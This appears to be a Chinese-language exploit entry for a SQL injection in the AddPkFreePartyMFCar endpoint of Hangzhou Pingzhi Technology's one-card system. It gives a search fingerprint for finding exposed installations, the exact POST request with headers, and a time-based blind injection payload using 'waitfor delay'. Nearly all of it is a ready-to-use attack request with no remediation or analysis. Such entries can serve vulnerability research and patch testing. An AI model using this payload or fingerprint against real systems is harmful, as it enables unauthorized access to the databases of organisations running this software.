# 杭州平治科技一卡通系统AddPkFreePartyMFCar存在SQL注入漏洞

- **系统**：杭州平治科技一卡通系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Images/duanxin.jpg"`
- **请求**：`POST /ex/AddPkFreePartyMFCar HTTP/1.1`
- **关键头**：`Content-Length: 49`　`Content-Type: application/x-www-form-urlencoded`　`If-Modified-Since: Tue, 04 Apr 2023 09:51:31 GMT`

**请求体 / payload**
```
id=1';waitfor delay '0:0:5'--+&cp=2&uykqtjsc=list
```
- **预期**：200　|　—